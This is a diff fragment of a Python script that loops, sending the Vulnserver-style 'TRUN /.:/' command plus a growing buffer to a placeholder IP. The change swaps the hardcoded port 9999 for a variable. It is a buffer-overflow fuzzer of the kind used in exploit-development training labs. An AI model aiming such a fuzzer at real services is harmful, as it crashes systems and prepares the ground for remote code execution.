@@ -10,7 +10,7 @@ while True:
         payload = "TRUN /.:/" + buffer
  
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('ip address',9999))
+        s.connect(('ip address',port))
         print ("[+] Sending the payload...\n" + str(len(buffer)))
         s.send((payload.encode()))
         s.close()
